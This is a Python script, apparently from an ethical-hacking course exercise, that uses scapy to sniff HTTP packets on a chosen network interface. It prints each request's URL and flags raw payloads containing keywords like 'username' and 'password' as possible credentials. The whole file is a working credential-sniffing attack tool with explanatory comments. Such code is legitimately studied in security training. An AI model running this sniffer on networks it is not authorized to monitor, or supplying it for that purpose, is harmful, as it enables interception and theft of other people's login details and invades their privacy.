#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
# importing 3rd party that reads http
import optparse
# optparse is the name of the module that allows us to get arguments from the user and parse them and use them within
# our code.


def get_arguments():
    parser = optparse.OptionParser()
    # "optparse" is created as an instance of the option parser class which is an object that can handle parsing
    # we're giving "parser" the arguments that it can expect from users
    parser.add_option("--i", dest="iinterface", help="name of the interface to sniff its packets ... (ex:eth0)")

    # we're going to tell this child to parse the arguments that it gets from the user.
    # "options"  this is what contains the values that the user
    # inputs to access the value for the interface name and the mac address
    # "arguments" variable is going to contain the arguments.
    (options, arguments) = parser.parse_args()

    # way to check and make sure that the user entered a value for the interface and also entered
    # a value for the Mac
    if not options.iinterface:
        parser.error("[-] please specify the interface name , use --help for more info")
    return options


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    # the function will capture packets using scapy function called sniff
    # and set args that get the interface name that we want to sniff from
    # also not to store those packets in our memory
    # and set a call back function that will run right after every packet that we sniff
    # u can add another arg named 'filter' for filtering port NO.


def get_url(packets):
    # this function extract the path and the host of URL from the packet
    return packets[http.HTTPRequest].Host + packets[http.HTTPRequest].Path


def get_login_info(packets):
    # this function will check for a raw layer of the sniffed packet and
    # a certain keywords in that layer to search for
    if packets.haslayer(scapy.Raw):
        load = packets[scapy.Raw].load
        keywords = ["username", "usrnme", "password", "pass", "login", "user_name"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packets):
    # check if the packet has layer that is http request
    # haslayer is a method implemented by scapy that checks if we has that layer in this packet
    if packets.haslayer(http.HTTPRequest):
        url = get_url(packets)
        print("http Request >> " + url)
        login_info = get_login_info(packets)
        # checking if there is a login info ...
        if login_info:
            print("\n\n possible username and password > " + login_info + "\n\n")


options = get_arguments()
sniff(str(options.iinterface))
